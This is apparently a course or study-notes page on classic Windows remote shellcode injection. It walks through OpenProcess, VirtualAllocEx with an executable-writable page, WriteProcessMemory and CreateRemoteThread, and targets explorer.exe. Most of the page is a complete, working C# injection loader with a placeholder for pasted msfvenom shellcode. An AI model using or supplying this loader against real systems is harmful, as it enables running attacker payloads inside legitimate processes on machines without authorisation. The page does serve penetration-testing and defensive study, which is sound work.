# 04.04 Shellcode Injection into Remote Process

> Section 5.1 · OpenProcess + VirtualAllocEx + WPM + CreateRemoteThread

## Overview

Classic remote shellcode injection in C#: open a handle to the target process (explorer.exe), allocate a RWX page in its address space, copy the shellcode there, then create a remote thread starting at the shellcode address. Target must be at same or lower integrity level.

## Steps

- **Resolve PID** — `Process.GetProcessesByName("explorer")[0].Id`.
- **OpenProcess** — `PROCESS_ALL_ACCESS (0x001F0FFF)`, `false`, target PID.
- **VirtualAllocEx** — handle, null, shellcode size, `MEM_COMMIT|MEM_RESERVE (0x3000)`, `PAGE_EXECUTE_READWRITE (0x40)`.
- **WriteProcessMemory** — copy shellcode bytes into the allocated region.
- **CreateRemoteThread** — start address = allocated region; thread runs shellcode in remote process.

### C# process injection (Inject.cs)

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

class Inject {
    [DllImport("kernel32.dll",SetLastError=true)]
    static extern IntPtr OpenProcess(uint dwAccess, bool bInherit, int pid);
    [DllImport("kernel32.dll",SetLastError=true,ExactSpelling=true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr lpAddr,
        uint dwSize, uint flType, uint flProt);
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProc, IntPtr lpBase,
        byte[] buf, uint nSize, out IntPtr lpWritten);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProc, IntPtr lpAttr,
        uint dwStack, IntPtr lpStart, IntPtr lpParam,
        uint dwFlags, IntPtr lpId);

    static void Main() {
        // paste msfvenom -f csharp output
        byte[] buf = new byte[] { 0xfc, 0x48, 0x83 /*, ... */ };

        int pid = Process.GetProcessesByName("explorer")[0].Id;
        IntPtr hProc = OpenProcess(0x001F0FFF, false, pid);
        IntPtr mem = VirtualAllocEx(hProc, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
        WriteProcessMemory(hProc, mem, buf, (uint)buf.Length, out _);
        CreateRemoteThread(hProc, IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
    }
}
```
